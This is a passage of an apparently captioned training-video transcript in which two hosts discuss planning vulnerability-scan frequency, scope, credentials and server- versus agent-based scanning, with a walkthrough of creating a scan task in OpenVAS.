very\ndescriptive names that\n\n27\n00:01:16.340 --> 00:01:18.614\nwe give things that you don't have to-\n&gt;&gt; [LAUGH] It could have done\n\n28\n00:01:18.614 --> 00:01:21.354\nother things, think like you went gun\nshopping and opened the garage door for\n\n29\n00:01:21.354 --> 00:01:24.038\nyou, you never know.\n&gt;&gt; Could have done that, but it doesn't,\n\n30\n00:01:24.038 --> 00:01:27.393\nit scans for vulnerabilities in your\ninformation systems networking,\n\n31\n00:01:27.393 --> 00:01:28.550\nnot all that good stuff.\n\n32\n00:01:28.550 --> 00:01:33.820\nSo, that's what we have to do but we can't\njust say well we'll fire the scan, great.\n\n33\n00:01:33.820 --> 00:01:36.136\nWhat do you firing off the scan too?\n&gt;&gt; Mm-hm.\n\n34\n00:01:36.136 --> 00:01:37.165\n&gt;&gt; How many times are you gonna\n\n35\n00:01:37.165 --> 00:01:37.800\nfire off a scan?\n\n36\n00:01:37.800 --> 00:01:38.810\nHow intense is that scan?\n\n37\n00:01:38.810 --> 00:01:39.830\nDoes it need credentials?\n\n38\n00:01:39.830 --> 00:01:40.370\nDoes it not?\n\n39\n00:01:40.370 --> 00:01:40.970\nAre you logged in?\n\n40\n00:01:40.970 --> 00:01:41.980\nAre you outside or inside?\n\n41\n00:01:41.980 --> 00:01:45.050\nThere's all sorts of\nvariables that come into play\n\n42\n00:01:45.050 --> 00:01:47.240\nwhen it comes to setting up that scan.\n\n43\n00:01:47.240 --> 00:01:52.001\nA, if you're in some regulatory\ninstitution, then you're gonna wanna\n\n44\n00:01:52.001 --> 00:01:56.093\nfollow the procedures that they\ngive you to set up those scans.\n\n45\n00:01:56.093 --> 00:01:59.733\nIf you are creating your own company\npolicy you have a little more carte\n\n46\n00:01:59.733 --> 00:02:03.620\nblanche to do as you will, but you still\nneed to follow whatever compliance\n\n47\n00:02:03.620 --> 00:02:07.790\nstandards you have decided to come up\nwith so that your policy is adhered to.\n\n48\n00:02:07.790 --> 00:02:10.400\nSo that is what we are going to talk\nabout today, how can we do that,\n\n49\n00:02:10.400 --> 00:02:12.900\nwhat are some of the ins and\nouts of setting up a scan.\n\n50\n00:02:12.900 --> 00:02:15.240\nWe are going to actually\nlook at setting up a scan or\n\n51\n00:02:15.240 --> 00:02:19.380\nlook at some scan I've already run and\njust get familiar with that.\n\n52\n00:02:19.380 --> 00:02:22.020\nThere's a myriad of different\nscanners out there,\n\n53\n00:02:22.020 --> 00:02:25.460\ntell them what probably makes the most\npopular one which is Nessus and\n\n54\n00:02:25.460 --> 00:02:28.580\nthere's a free version of Nessus, but\nI went off the beaten path a little bit.\n\n55\n00:02:28.580 --> 00:02:30.061\nThere's another really.\n&gt;&gt; It was really fun I followed you.\n\n56\n00:02:30.061 --> 00:02:32.133\n&gt;&gt; Yes, there's another one out there I\n\n57\n00:02:32.133 --> 00:02:35.760\nlike to use just because it's\npretty simple again working in and,\n\n58\n00:02:35.760 --> 00:02:36.680\nwork with them.\n\n59\n00:02:36.680 --> 00:02:41.250\nThey've got some cool animations, but\nit's very robust, don't let it fool you\n\n60\n00:02:41.250 --> 00:02:46.250\njust cuz it's free that it wouldn't do\nthe trick, it would definitely have some\n\n61\n00:02:46.250 --> 00:02:50.660\nstuff in there which is OpenVAS very\nvery popular, open source scanner.\n\n62\n00:02:50.660 --> 00:02:54.460\nSo, as what we're gonna use today, I kinda\nshowed you that in a previous sub set.\n\n63\n00:02:54.460 --> 00:02:55.930\nWhat it is and how to login.\n\n64\n00:02:55.930 --> 00:02:59.720\nSo I fired up the server,\nI've got that up and running, and\n\n65\n00:02:59.720 --> 00:03:02.620\nwe'll take a look at the reports and\ncreate a task and\n\n66\n00:03:02.620 --> 00:03:07.107\ndo stuff with it as we move on.\n&gt;&gt; Today, using OpenVAS, open source,\n\n67\n00:03:07.107 --> 00:03:09.340\nthat's free, right?\n\n68\n00:03:09.340 --> 00:03:10.350\n&gt;&gt; Correct.\n&gt;&gt; Yeah.\n\n69\n00:03:10.350 --> 00:03:11.030\n&gt;&gt; Absolutely.\n\n70\n00:03:11.030 --> 00:03:14.130\nOpen source community comes together and\nthey do what they do.\n\n71\n00:03:14.130 --> 00:03:15.880\nThey create great products\nfrom time to time.\n\n72\n00:03:15.880 --> 00:03:18.180\nOpenVAS is definitely one of them.\n\n73\n00:03:18.180 --> 00:03:22.330\nIf you are a larger entity, you probably\nwanna go with more something like Nessus.\n\n74\n00:03:22.330 --> 00:03:23.540\nGo with Tenables.\n\n75\n00:03:23.540 --> 00:03:28.760\nPay the money, it's going to be\nprobably faster, more robust.\n\n76\n00:03:28.760 --> 00:03:29.680\nProbably more reliable.\n\n77\n00:03:29.680 --> 00:03:31.260\nYou get support.\n\n78\n00:03:31.260 --> 00:03:37.380\nNot that you don't get those things with\nOpenVAS, but it's not as, I don't want\n\n79\n00:03:37.380 --> 00:03:41.050\nto offend the OpenVAS people, I love it.\n&gt;&gt; And they're all watching, right now.\n\n80\n00:03:41.050 --> 00:03:41.730\n&gt;&gt; Yes, they all are,\n\n81\n00:03:41.730 --> 00:03:42.780\nright now.\n&gt;&gt; Anyone of them.\n\n82\n00:03:42.780 --> 00:03:43.970\n&gt;&gt; Staring at me\n\n83\n00:03:43.970 --> 00:03:45.671\nwith contempt in their heart, right?\n\n84\n00:03:45.671 --> 00:03:48.036\n[LAUGH] I love OpenVAS.\n&gt;&gt; There you go.\n\n85\n00:03:48.036 --> 00:03:50.755\n&gt;&gt; And you can definitely,\n\n86\n00:03:50.755 --> 00:03:54.129\nsmaller businesses, use it.\n\n87\n00:03:54.129 --> 00:03:58.803\nBut if you are at an enterprise level they\nwant to use their enterprise level nest\n\n88\n00:03:58.803 --> 00:04:01.490\nscanner, so just keep that in mind.\n\n89\n00:04:01.490 --> 00:04:04.650\nAll right, let's bop through this.\n\n90\n00:04:04.650 --> 00:04:09.740\nLet's talk about some of the things we\nneed to think about when it comes to\n\n91\n00:04:09.740 --> 00:04:10.600\ngetting that scan,\n\n92\n00:04:10.600 --> 00:04:16.090\nstarting to build the template of what\nour scanning policy will be, okay?\n\n93\n00:04:16.090 --> 00:04:20.369\nSo, this will be how often\nwe'll we scan things.\n\n94\n00:04:20.369 --> 00:04:22.400\nI don't know, it's a good question.\n\n95\n00:04:22.400 --> 00:04:25.250\nIt will depend on a few variables, right?\n\n96\n00:04:25.250 --> 00:04:29.340\nAm I in a regulatory, is this going\nto be dictated from on high for\n\n97\n00:04:29.340 --> 00:04:31.900\nme to tell me this is\nhow often you must scan.\n\n98\n00:04:31.900 --> 00:04:34.470\nWe kind of saw that when we looked\nat some of those regulations.\n\n99\n00:04:34.470 --> 00:04:39.245\nI think it was PCI that said you must\nscan x amount of times per x time period.\n\n100\n00:04:39.245 --> 00:04:40.090\n&gt;&gt; [LAUGH]\n\n101\n00:04:40.090 --> 00:04:40.830\n&gt;&gt; They let me know\n\n102\n00:04:40.830 --> 00:04:42.040\nthis is how often you scan.\n\n103\n00:04:42.040 --> 00:04:45.940\nGreat, I know exactly how\noften I should be scanned or\n\n104\n00:04:45.940 --> 00:04:48.390\nI should be scanning should I say.\n\n105\n00:04:48.390 --> 00:04:49.720\nWhat is my risk appettite?\n\n106\n00:04:50.780 --> 00:04:55.610\nHow much risk am I willing to accept,\nbecause here is the thing about scanning\n\n107\n00:04:56.750 --> 00:05:00.630\nis just because I scanned today doesn't\nmean I shouldn't scan tomorrow, but\n\n108\n00:05:00.630 --> 00:05:01.350\nshould I, shouldn't I?\n\n109\n00:05:01.350 --> 00:05:03.180\nI don't know,\nthat's what we're talking about.\n\n110\n00:05:03.180 --> 00:05:09.530\nMy risk appetite is gonna dictate\nsometimes maybe the majority of the times.\n\n111\n00:05:09.530 --> 00:05:11.550\nHow often I run a scan.\n\n112\n00:05:11.550 --> 00:05:15.990\nIf I have no tolerance for risk,\nmaybe I'm running scan once a week.\n\n113\n00:05:15.990 --> 00:05:18.320\nMaybe I'm running a scan once a day.\n\n114\n00:05:18.320 --> 00:05:19.150\nNever know, right?\n\n115\n00:05:19.150 --> 00:05:26.860\nThis all comes down to how much risk am I\ngoing to allow inside of my organization.\n\n116\n00:05:26.860 --> 00:05:29.440\nWhat was my risk appetite, okay?\n\n117\n00:05:29.440 --> 00:05:31.277\nLet's see here.\n\n118\n00:05:31.277 --> 00:05:32.463\nTalked about that.\n\n119\n00:05:32.463 --> 00:05:34.030\nTechnical constraints.\n\n120\n00:05:34.030 --> 00:05:35.220\nThis definitely comes into play.\n\n121\n00:05:36.300 --> 00:05:39.790\nIf my scanning machine is on a server,\n\n122\n00:05:39.790 --> 00:05:44.790\nand that server is four years old and\nin that four\n\n123\n00:05:44.790 --> 00:05:48.120\nyear time since I bought that server,\nI've upgraded my network bandwidth.\n\n124\n00:05:48.120 --> 00:05:49.790\nI've upgraded a lot of stuff.\n\n125\n00:05:49.790 --> 00:05:53.210\nAnd I've got high network utilization,\n\n126\n00:05:53.210 --> 00:05:56.000\nbandwidth utilization,\ndevices on the network.\n\n127\n00:05:56.000 --> 00:05:58.840\nI'm on running all sorts of interesting\nthings now that wasn’t there when I\n\n128\n00:05:58.840 --> 00:06:00.160\nfirst developed the thing.\n\n129\n00:06:00.160 --> 00:06:04.210\nMaybe now that thing is bogged down and\nit needs to be upgraded, right?\n\n130\n00:06:04.210 --> 00:06:08.680\nBecause if you have lower performing\nsystem that you're scanning is being done,\n\n131\n00:06:08.680 --> 00:06:11.910\nthen it's gonna impact\nthe performance of the scans.\n\n132\n00:06:11.910 --> 00:06:12.829\nMight take longer.\n\n133\n00:06:14.880 --> 00:06:18.855\nWell, instead of running it once a day,\nI'm going to run it just once a month,\n\n134\n00:06:18.855 --> 00:06:21.204\nbecause it is just such\na bear to get through and\n\n135\n00:06:21.204 --> 00:06:25.301\nit affects performance on my network,\nit affects performance on that machine,\n\n136\n00:06:25.301 --> 00:06:28.292\nit affects performance on\nmachines that it's scanning.\n\n137\n00:06:28.292 --> 00:06:32.113\nSo I cannot tolerate that\non a frequent basis, so\n\n138\n00:06:32.113 --> 00:06:34.827\nwe're going to have to come down.\n\n139\n00:06:34.827 --> 00:06:39.327\nThe performance of the devices\nthat it's scanning and itself,\n\n140\n00:06:39.327 --> 00:06:42.170\nit's going to impact how often we scan.\n\n141\n00:06:44.070 --> 00:06:47.810\nThen maybe your workflow dictates this.\n\n142\n00:06:47.810 --> 00:06:52.150\nWhen I say workflow, I mean,\nwhat's happening in my company.\n\n143\n00:06:52.150 --> 00:06:56.220\nSo 8 o'clock in the morning you\ngot to company what happens at 8\n\n144\n00:06:56.220 --> 00:07:00.990\no'clock in the morning if you run from\n8 to 5, people come to work, and Zach,\n\n145\n00:07:00.990 --> 00:07:04.830\nwhat do you think the first thing someone\ndoes who works in an office environment\n\n146\n00:07:04.830 --> 00:07:08.020\nwhen they get to their desks?\n&gt;&gt; Fires up their desktop or laptop,\n\n147\n00:07:08.020 --> 00:07:10.260\nwhichever the case may be.\n&gt;&gt; And they're logging in,\n\n148\n00:07:10.260 --> 00:07:12.200\ncreating a lot of traffic.\n\n149\n00:07:12.200 --> 00:07:17.850\nOr maybe let's look at it this way,\nmaybe my peak hours for\n\n150\n00:07:17.850 --> 00:07:22.890\nsales are one in the afternoon\nto three in the afternoon.\n\n151\n00:07:22.890 --> 00:07:26.850\nEveryday man for whatever reason\nthat's when the phones are ringing and\n\n152\n00:07:26.850 --> 00:07:31.402\norders are being taken, and I need to make\nsure the user experience the people that\n\n153\n00:07:31.402 --> 00:07:35.870\nare calling, the people that are accessing\nour website to buy something or\n\n154\n00:07:35.870 --> 00:07:40.160\nget a service or whatever it we provide\nuse to be the best they can be.\n\n155\n00:07:40.160 --> 00:07:42.350\nOf course I want that at\nall hours of the day.\n\n156\n00:07:42.350 --> 00:07:48.300\nMaybe that's really the most inopportune\ntime for any kind of pickup or\n\n157\n00:07:48.300 --> 00:07:51.880\ninteractions that might occur from skinny,\ncuz sometimes that does occur.\n\n158\n00:07:51.880 --> 00:07:54.890\nScanning can interrupt things,\nbecause it is taking up resources.\n\n159\n00:07:54.890 --> 00:08:00.746\nAnd I want as best of experiences as\nI can give them from those hours.\n\n160\n00:08:00.746 --> 00:08:04.075\nSo my workflow says don't\nscan during those times.\n\n161\n00:08:04.075 --> 00:08:06.092\nOr maybe it's the holiday season.\n\n162\n00:08:06.092 --> 00:08:10.370\nAnd I'm just not gonna scan\nduring the holiday season.\n\n163\n00:08:10.370 --> 00:08:11.490\nBecause I'm hammered 24/7 and\n\n164\n00:08:11.490 --> 00:08:18.330\nI can't take the hits to performance\nfrom running vulnerability scans.\n\n165\n00:08:18.330 --> 00:08:21.050\nSo I wanna look for a more opportune time,\nit wouldn't be then.\n\n166\n00:08:21.050 --> 00:08:26.260\nSo my workflow, when I work,\nhow intense that work is happening,\n\n167\n00:08:26.260 --> 00:08:31.000\nanything that could be impacted\nnegatively, could definitely\n\n168\n00:08:31.000 --> 00:08:35.070\ndictate when and how frequent you scan.\n&gt;&gt; So it's that uncommon for\n\n169\n00:08:35.070 --> 00:08:37.920\na scan to take place overnight, right?\n&gt;&gt; That's exactly correct.\n\n170\n00:08:37.920 --> 00:08:43.740\nA lot of times you'll just schedule your\nscans to run at the most opportune time.\n\n171\n00:08:43.740 --> 00:08:47.480\nJust say, you know what, at night no one's\nhere and I hardly have any kind of web\n\n172\n00:08:47.480 --> 00:08:51.320\ntraffic going on or access of\nthe network or whatever the case is.\n\n173\n00:08:51.320 --> 00:08:53.513\nSo that would be the most\nopportune time to run, so\n\n174\n00:08:53.513 --> 00:08:55.455\nthat's when I'll schedule my scan to run.\n\n175\n00:08:55.455 --> 00:08:57.943\nAnd that's the great thing about most\nscanners is that you can schedule them.\n\n176\n00:08:57.943 --> 00:08:58.513\n&gt;&gt; Yes.\n\n177\n00:08:58.513 --> 00:09:01.640\n&gt;&gt; To say start at X, Y, and Z time.\n\n178\n00:09:01.640 --> 00:09:03.470\nAnd lay that out for yourself.\n\n179\n00:09:03.470 --> 00:09:04.820\nYou don't have to manually fire that off.\n\n180\n00:09:04.820 --> 00:09:06.990\nThat's a lot of work for you anyway.\n&gt;&gt; Mm-hm.\n\n181\n00:09:06.990 --> 00:09:08.170\n&gt;&gt; The fact that we can schedule these\n\n182\n00:09:08.170 --> 00:09:09.950\nthings is excellent for us.\n\n183\n00:09:09.950 --> 00:09:11.280\nTake advantage of that.\n\n184\n00:09:11.280 --> 00:09:15.224\nYour scanners, figure what your\nscanning frequency is going to be,\n\n185\n00:09:15.224 --> 00:09:17.814\nand set your scanner schedule accordingly.\n\n186\n00:09:17.814 --> 00:09:21.379\nAll right,\nlet's start looking at scanners, right?\n\n187\n00:09:21.379 --> 00:09:22.890\n&gt;&gt; Let's take a look at OpenVAS.\n\n188\n00:09:22.890 --> 00:09:24.030\n&gt;&gt; Yes, let's go to OpenVAS.\n\n189\n00:09:24.030 --> 00:09:24.950\nLet's jump to my computer.\n\n190\n00:09:24.950 --> 00:09:28.730\nI've already logged in, and the only thing\nyou haven't seen is basically me starting\n\n191\n00:09:28.730 --> 00:09:32.657\nthe service, which we saw in another\nepisode, which is me saying openvas-start.\n\n192\n00:09:32.657 --> 00:09:33.250\n&gt;&gt; [LAUGH]\n\n193\n00:09:33.250 --> 00:09:35.640\n&gt;&gt; And then it fires up the web browser.\n\n194\n00:09:35.640 --> 00:09:36.280\n&gt;&gt; It's so complicated.\n\n195\n00:09:36.280 --> 00:09:38.170\n&gt;&gt; Yeah, I know, it's really difficult.\n\n196\n00:09:38.170 --> 00:09:40.020\nAnd then it fires up a web server.\n\n197\n00:09:40.020 --> 00:09:44.550\nAnd gives the username and\npassword login portal.\n\n198\n00:09:44.550 --> 00:09:45.590\nSo, I logged in.\n\n199\n00:09:45.590 --> 00:09:49.590\nThis is the landing page for OpenVAS.\n\n200\n00:09:49.590 --> 00:09:52.600\nI'm just going to move\nthis over just a hair,\n\n201\n00:09:52.600 --> 00:09:54.340\nbecause I know my head's right there.\n\n202\n00:09:54.340 --> 00:09:55.760\nThat's perfect!\n\n203\n00:09:55.760 --> 00:09:56.330\nPerfection!\n\n204\n00:09:56.330 --> 00:09:56.950\nLook at that.\n\n205\n00:09:56.950 --> 00:09:57.970\nSo there we go.\n\n206\n00:09:57.970 --> 00:10:00.000\nSo looking at the dashboard,\nwe love dashboards.\n\n207\n00:10:00.000 --> 00:10:00.720\nDashboards are great.\n\n208\n00:10:00.720 --> 00:10:04.150\nThey're so cool because we get pie\ncharts and colors, and graphs.\n\n209\n00:10:04.150 --> 00:10:05.560\nMy, it's so wonderful.\n\n210\n00:10:05.560 --> 00:10:07.480\nMaybe get some, maybe host topology.\n\n211\n00:10:07.480 --> 00:10:10.510\nRemember we talked about topology\nback in our previous episode.\n\n212\n00:10:10.510 --> 00:10:11.340\nThere we go, right there.\n\n213\n00:10:11.340 --> 00:10:15.400\nI can zoom in and out and you get\na better idea of what's going on there.\n\n214\n00:10:15.400 --> 00:10:19.740\nSame kind of idea that we saw when\nwe used nmap or zmap as it were.\n\n215\n00:10:19.740 --> 00:10:23.040\nSo if we need to do topology stuff,\nmaybe do it right here with open box.\n\n216\n00:10:23.040 --> 00:10:26.210\nThat's a part of your scanner or\nmaybe it's not.\n\n217\n00:10:26.210 --> 00:10:27.740\nThat's the thing.\n\n218\n00:10:27.740 --> 00:10:32.680\nIn the exam they're not really going\nto test you on specifics about scanners\n\n219\n00:10:32.680 --> 00:10:37.030\nother than standards that you'll\nfrom one scanner to the other.\n\n220\n00:10:37.030 --> 00:10:38.772\nOkay, so that's what we're going to focus.\n\n221\n00:10:38.772 --> 00:10:46.142\nAll right so, we have tasks we\nneed to create a task a scan.\n\n222\n00:10:46.142 --> 00:10:49.696\nI need to be able to carry the scan,\nso I am going to go through that,\n\n223\n00:10:49.696 --> 00:10:52.297\nI am going to look here I\nam going to create a scan,\n\n224\n00:10:52.297 --> 00:10:56.340\nso I am going to hit tasks under the scans\ntab, this is specific to OpenVAS.\n\n225\n00:10:56.340 --> 00:11:01.990\nI am going to go here, I can see the names\nof scans that I already have created,\n\n226\n00:11:01.990 --> 00:11:04.940\nso I can look at them, edit them.\n\n227\n00:11:04.940 --> 00:11:09.560\nIf I want or I can create a new\none by coming probably over\n\n228\n00:11:09.560 --> 00:11:12.889\nto the task wizard and creating a task.\n\n229\n00:11:12.889 --> 00:11:13.770\nSo here we go.\n\n230\n00:11:13.770 --> 00:11:17.810\nQuick start immediately scan\nan IP address, so I can do this.\n\n231\n00:11:17.810 --> 00:11:21.960\nI can get this going and\ndo an immediate scan.\n\n232\n00:11:21.960 --> 00:11:25.640\nSo if I want to run scan right now,\nI've just popped in the IP address.\n\n233\n00:11:25.640 --> 00:11:27.272\n&gt;&gt; So, OpenVAS makes it very easy for\n\n234\n00:11:27.272 --> 00:11:29.058\nyou.\n&gt;&gt; Yeah,\n\n235\n00:11:29.058 --> 00:11:32.979\nI'm succeeding here though 55.145,\nand then start scan.\n\n236\n00:11:32.979 --> 00:11:35.900\nI can far away,\nI'll even let it go, no problem.\n\n237\n00:11:37.510 --> 00:11:40.380\nAnd, now I can see that I\n\n238\n00:11:40.380 --> 00:11:44.460\nhave task 505 giving me the severity\nof the tasks I've already run.\n\n239\n00:11:44.460 --> 00:11:49.030\nBut I've got this immediate scan running,\nand you can see it here in my task names.\n\n240\n00:11:49.030 --> 00:11:52.420\nHere it is, probably this guy right here,\n\n241\n00:11:52.420 --> 00:11:56.260\ncuz it says requested,\nof some other requested.\n\n242\n00:11:56.260 --> 00:11:59.400\nThese are other scans that I've\ncreated that are scheduled.\n\n243\n00:11:59.400 --> 00:12:04.610\nRight, so it's not an immediate scan,\nsee these down here are scheduled scans.\n\n244\n00:12:04.610 --> 00:12:07.480\nSo going back to the idea of scheduling.\n&gt;&gt; So you've\n\n245\n00:12:07.480 --> 00:12:10.670\nactually mentioned a few things already,\nbut what are some of the other things,\n\n246\n00:12:10.670 --> 00:12:14.730\nor some of the important points that we\nneed to look for when we create a scan,\n\n247\n00:12:14.730 --> 00:12:16.680\nwhen we're going through a scan?\n&gt;&gt; Yeah, good question.\n\n248\n00:12:16.680 --> 00:12:18.700\nWhat should we be looking for?\n\n249\n00:12:18.700 --> 00:12:23.170\nAs we create the scan, some of that items,\nsome of those commonalities\n\n250\n00:12:23.170 --> 00:12:27.840\nbetween scanners that I should\nprobably see when I create a scan.\n\n251\n00:12:27.840 --> 00:12:29.110\nSensitivity levels.\n\n252\n00:12:29.110 --> 00:12:32.910\nLike how intense you want the scan to be.\n\n253\n00:12:32.910 --> 00:12:33.470\nWhat else?\n\n254\n00:12:33.470 --> 00:12:35.510\nVulnerability fields, this is interesting.\n\n255\n00:12:35.510 --> 00:12:40.010\nThis is how the scanners knows\nthat this and that might be\n\n256\n00:12:40.010 --> 00:12:45.140\na vulnerability It has a feed to it,\ntypically from the mothership, right?\n\n257\n00:12:45.140 --> 00:12:49.100\nThe host company that keeps\na list of these things.\n\n258\n00:12:49.100 --> 00:12:52.880\nAnd they try to keep them up to date\nas current as humanly possible, so\n\n259\n00:12:52.880 --> 00:12:56.470\nthat your scanner can\njust download them in or\n\n260\n00:12:56.470 --> 00:13:02.270\nyou run an update a thing to let it know,\nhey, check for new vulnerabilities and\n\n261\n00:13:02.270 --> 00:13:05.900\ndownload them into your local database, so\nthat when you run a scan they'll be there.\n\n262\n00:13:05.900 --> 00:13:09.380\nSo vulnerability feeds, do I need to\nset that up or do I do that manually?\n\n263\n00:13:09.380 --> 00:13:10.700\nHow does that work and\nwe'll look for that.\n\n264\n00:13:11.760 --> 00:13:13.830\nThe scope, what is the scope?\n\n265\n00:13:13.830 --> 00:13:16.010\nWe kinda saw that just a second ago.\n\n266\n00:13:16.010 --> 00:13:17.800\nWe gave it a scope of one.\n\n267\n00:13:17.800 --> 00:13:22.930\nWe said, here is the device that I want\nyou to scan, and that is the scope.\n\n268\n00:13:22.930 --> 00:13:25.650\nWhen we create a schedule scan we'll be\nable to get a little more detailed and\n\n269\n00:13:25.650 --> 00:13:27.860\nsay, I want you to scan IP range.\n\n270\n00:13:27.860 --> 00:13:31.670\nOr I want you to scan x,\ny, and z machines, right?\n\n271\n00:13:31.670 --> 00:13:36.160\nSo whatever that is, whatever you tell\nit to scan, that's gonna be the scope.\n\n272\n00:13:36.160 --> 00:13:37.369\nSo you look for that scope area.\n\n273\n00:13:39.410 --> 00:13:42.580\nAgain, also, how,\nwhat systems will be included?\n\n274\n00:13:42.580 --> 00:13:45.931\nHow will you verify that the systems\nare online to be scanned?\n\n275\n00:13:45.931 --> 00:13:48.537\nRight, so you wanna make sure that if\nyou put something on the scope that\n\n276\n00:13:48.537 --> 00:13:50.460\nit's actually available to\nthe scanner to scan it.\n\n277\n00:13:50.460 --> 00:13:52.020\nOtherwise it's gonna have\na hard time doing that.\n\n278\n00:13:52.020 --> 00:13:53.720\nSo just keep that in mind.\n\n279\n00:13:53.720 --> 00:13:55.490\nAnd what tests will be formed.\n\n280\n00:13:55.490 --> 00:13:59.390\nThat will also be inside of the scope,\nokay?\n\n281\n00:13:59.390 --> 00:14:00.138\nSo let's see here.\n\n282\n00:14:00.138 --> 00:14:03.351\nCredentialed versus\nnon-credentialed scans.\n\n283\n00:14:03.351 --> 00:14:05.992\nThis will also be something\nyou probably come across.\n\n284\n00:14:05.992 --> 00:14:08.887\nA lot of times you will have systems that,\n\n285\n00:14:08.887 --> 00:14:12.970\nespecially web-based APIs,\nthings of that nature.\n\n286\n00:14:12.970 --> 00:14:16.040\nOr I've got a web front end,\na portal for people log into.\n\n287\n00:14:16.040 --> 00:14:21.230\nAnd that's how they access\nthe user portion of our\n\n288\n00:14:21.230 --> 00:14:25.210\nweb store or whatever it is that your\norganization you're involved in.\n\n289\n00:14:25.210 --> 00:14:28.680\nDo I need to put in a user name and\npassword to access that?\n\n290\n00:14:28.680 --> 00:14:31.000\nSo if you do, you might need to\ngive that to your scanner so\n\n291\n00:14:31.000 --> 00:14:35.600\nthat it can get past that and see as well.\n&gt;&gt; Does that correlate to certificates?\n\n292\n00:14:35.600 --> 00:14:38.180\n&gt;&gt; Not necessarily, but it may.\n\n293\n00:14:38.180 --> 00:14:40.020\nYou may need to add certificates.\n&gt;&gt; Yeah.\n\n294\n00:14:40.020 --> 00:14:41.120\n&gt;&gt; To the scan and say, hey,\n\n295\n00:14:41.120 --> 00:14:45.700\nI've got a certificate\nthat authenticates me and\n\n296\n00:14:45.700 --> 00:14:48.660\nthat's my level of credentials.\n&gt;&gt; There you go.\n\n297\n00:14:48.660 --> 00:14:50.610\n&gt;&gt; And feed that in, you'll just point to,\n\n298\n00:14:50.610 --> 00:14:52.920\nyou'll have that file uploaded or\n\n299\n00:14:52.920 --> 00:14:58.120\naccessible by the scanner itself, tell\na pointer to it, here's my certificates.\n\n300\n00:14:58.120 --> 00:15:01.408\nNow when you run a scan, if it asks for\na certificate, you can feed it back.\n\n301\n00:15:01.408 --> 00:15:04.570\nAnd you should be able to access\nthose regions that [INAUDIBLE].\n\n302\n00:15:04.570 --> 00:15:05.155\n&gt;&gt; Very cool.\n\n303\n00:15:05.155 --> 00:15:08.050\n&gt;&gt; Secure, all right, let's see here.\n\n304\n00:15:08.050 --> 00:15:13.300\nWhat type of data is\ngoing to be in the scan?\n\n305\n00:15:13.300 --> 00:15:17.060\nDo I just want to scan these machines or\n\n306\n00:15:17.060 --> 00:15:20.020\nmaybe just the file system it\ndepends on the scanner obviously?\n\n307\n00:15:20.020 --> 00:15:25.310\nWhat types of data might be a part of\nthe scan itself when you do the setup.\n\n308\n00:15:26.390 --> 00:15:27.600\nAnything else?\n\n309\n00:15:27.600 --> 00:15:32.516\nServer-based versus agent-based, this is\ninteresting and some people say yeah,\n\n310\n00:15:32.516 --> 00:15:36.810\nserver-based all day long or no,\nagent-based is the way to go.\n\n311\n00:15:36.810 --> 00:15:41.710\nAnd all we're talking about here\nis what we're gonna show you\n\n312\n00:15:41.710 --> 00:15:44.680\nhere is a server-based we've\nbeen looking at with OpenVAS.\n\n313\n00:15:44.680 --> 00:15:46.060\nThis is server-based.\n\n314\n00:15:46.060 --> 00:15:47.250\nI have a server.\n\n315\n00:15:47.250 --> 00:15:48.570\nIt has OpenVAS installed.\n\n316\n00:15:48.570 --> 00:15:52.481\nThe server contacts remote\nhosts through the network and\n\n317\n00:15:52.481 --> 00:15:56.648\nscans them from the outside in,\nand pulls back the results.\n\n318\n00:15:56.648 --> 00:16:00.849\nAgent-based is a small piece of\nsoftware that you install on all of\n\n319\n00:16:00.849 --> 00:16:03.031\nthe clients that you want to scan.\n\n320\n00:16:03.031 --> 00:16:06.743\nThey scan from the inside,\nfrom the machine itself and\n\n321\n00:16:06.743 --> 00:16:12.370\nthen report back to the server, and\nsay, here's what I found there you go.\n\n322\n00:16:12.370 --> 00:16:15.600\nAnd there are some pros and\ncons to all these things.\n\n323\n00:16:15.600 --> 00:16:20.430\nPros from the server is you only have to\nmaintain one device, the server is there,\n\n324\n00:16:20.430 --> 00:16:22.542\nthey set up all these stuff on that.\n\n325\n00:16:22.542 --> 00:16:26.690\nNow a lot of times even with agent based\nyou have centralized management where you\n\n326\n00:16:26.690 --> 00:16:29.560\nlog in to one place and\nit reaches out to all the clients.\n\n327\n00:16:29.560 --> 00:16:32.260\nAnd you can even install clients and\ndelete clients and\n\n328\n00:16:32.260 --> 00:16:35.470\ndo all the administrative tasks that you\nwould that you have to go from there.\n\n329\n00:16:35.470 --> 00:16:39.290\nSo there's a real push to go agent\nbased just cuz it seems to be\n\n330\n00:16:39.290 --> 00:16:41.730\na bit of a more robust solution.\n\n331\n00:16:41.730 --> 00:16:45.850\nAlso the performance hits,\nso you don't have\n\n332\n00:16:45.850 --> 00:16:49.960\none server that has to be mega awesome\nthat can handle lots of performance and\n\n333\n00:16:49.960 --> 00:16:54.720\nthen your network has to be able to handle\nthe scanning and all the other good stuff.\n\n334\n00:16:54.720 --> 00:17:00.280\nThe agents just run locally using local\nresources which is usually a lot less.\n\n335\n00:17:00.280 --> 00:17:02.760\nIt creates a lot less network traffic,\nbecause it does not\n\n336\n00:17:02.760 --> 00:17:06.430\nscan return information, scan return\ninformation, scan return information.\n\n337\n00:17:06.430 --> 00:17:11.570\nIt's all done locally,\ncompiled into a pretty pink\n\n338\n00:17:11.570 --> 00:17:15.770\npackage with a bow on it and sent back to\nthe server and say, here are the results.\n\n339\n00:17:15.770 --> 00:17:17.840\nSo it's much less intensive and\n\n340\n00:17:17.840 --> 00:17:20.140\noverhead when it comes to\nthe network traffic as well.\n\n341\n00:17:20.140 --> 00:17:22.823\nSo agent-based is getting\na lot of traction nowadays, so\n\n342\n00:17:22.823 --> 00:17:25.933\nyou might want to go that way.\n&gt;&gt; Yeah, I can see the agent base\n\n343\n00:17:25.933 --> 00:17:29.410\nbeing a little bit more work\nintensive to set up initially.\n\n344\n00:17:29.410 --> 00:17:32.950\nBut then the outcome would be probably\nmore efficient, I would think.\n\n345\n00:17:32.950 --> 00:17:34.820\nBut how do we know all this works?\n\n346\n00:17:34.820 --> 00:17:37.740\nHow do we know this all will work?\n&gt;&gt; That's a great question.\n\n347\n00:17:37.740 --> 00:17:43.020\nI think what you mean by that\nis how do I know that my scans?\n\n348\n00:17:43.020 --> 00:17:43.920\n&gt;&gt; How do you know it's accurate?\n\n349\n00:17:43.920 --> 00:17:44.820\n&gt;&gt; Yeah, yeah,\n\n350\n00:17:44.820 --> 00:17:46.020\nhow do I know that's accurate?\n\n351\n00:17:46.020 --> 00:17:48.621\nThat's exactly right,\nI know where you're going with this.\n\n352\n00:17:48.621 --> 00:17:49.640\nThat's a good question.\n\n353\n00:17:49.640 --> 00:17:51.700\nWe've gotta be updating these things.\n\n354\n00:17:51.700 --> 00:17:55.900\nJust like any other 